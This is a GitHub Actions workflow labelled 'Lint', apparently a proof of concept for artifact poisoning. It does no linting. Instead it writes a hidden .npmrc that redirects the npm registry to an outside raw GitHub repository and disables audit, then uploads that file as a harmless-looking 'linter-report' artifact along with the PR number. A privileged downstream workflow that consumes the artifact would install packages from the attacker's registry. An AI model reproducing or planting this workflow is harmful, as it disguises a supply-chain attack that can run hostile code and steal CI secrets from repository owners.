name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Assemble artifact
        run: |
          mkdir -p out
          printf 'registry=https://raw.githubusercontent.com/PDFtoMark/gab-poc-wfr-artifact/main/npmreg8/\naudit=false\nfund=false\nprogress=false\n' > out/.npmrc
          printf 'baseline report\n' > out/linter-report.txt
          echo "${{ github.event.pull_request.number }}" > out/pr-number.txt
          ls -la out
      - name: Upload linter report
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: out/
          include-hidden-files: true
          if-no-files-found: ignore
